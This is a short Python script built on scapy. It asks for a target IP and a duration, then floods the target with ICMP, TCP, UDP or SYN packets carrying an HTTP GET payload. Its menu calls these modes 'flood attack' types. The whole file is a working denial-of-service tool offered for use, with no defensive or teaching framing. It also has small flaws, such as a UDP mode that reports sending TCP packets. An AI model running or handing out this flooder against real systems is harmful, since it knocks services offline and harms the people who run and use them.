from scapy.all import IP,ICMP,send,TCP,UDP,Raw
import time as t

def icmp_dump(ip,duration):

    start_time = t.time() 
    icmp_packet = IP(dst=ip)/ICMP()
    print(f"Sending IMCP packets for {duration} secs\nSending...")
    while t.time() - start_time <  duration :
        send(icmp_packet,verbose = False)
    print("Packets Sent!")


def tcp_dump(ip,duration):

    start_time = t.time() 
    tcp_packet = IP(dst=ip)/TCP()
    print(f"Sending TCP packets for {duration} secs\nSending...")
    while t.time() - start_time <  duration :
        send(tcp_packet,verbose = False)
    print("Packets Sent!")

        
def udp_dump(ip,duration,port,packet_size= 1024):

    start_time = t.time() 
    packet = IP(dst=ip)/UDP(dport=port)/Raw(b"X" * packet_size)
    print(f"Sending TCP packets for {duration} secs\nSending...")
    while t.time() - start_time <  duration :
        send(packet,verbose = False)
    print("Packets Sent!")

def http_dump(ip,duration,port):
    
    start_time = t.time() 
    packet = IP(dst=ip)/TCP(dport=port, flags="S")/Raw(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
    print(f"Sending HTTP packets for {duration} secs\nSending...")
    while t.time() - start_time <  duration :
        send(packet, verbose=False)
    print("Packets Sent!")


target_ip = input("Enter the target ip: ")

if target_ip.count('.') == 3:
    dump_time = int(input("Enter the time to dump(seconds): "))
    print("Choose the type of flood attack \n1 : ICMP\n2 : TCP\n3 : UDP\n4: HTTP")
    choice = int(input(": "))
    if choice ==1 :
        icmp_dump(target_ip,dump_time)
    elif choice == 2:
        tcp_dump(target_ip,dump_time)
    elif choice == 3:
        port = int(input("Enter the port no: "))
        udp_dump(target_ip,dump_time,port)
    else:
        port = int(input("Enter the port no: "))
        http_dump(target_ip,dump_time,port)
else:
    print("Invalid IP Address!\nExiting")


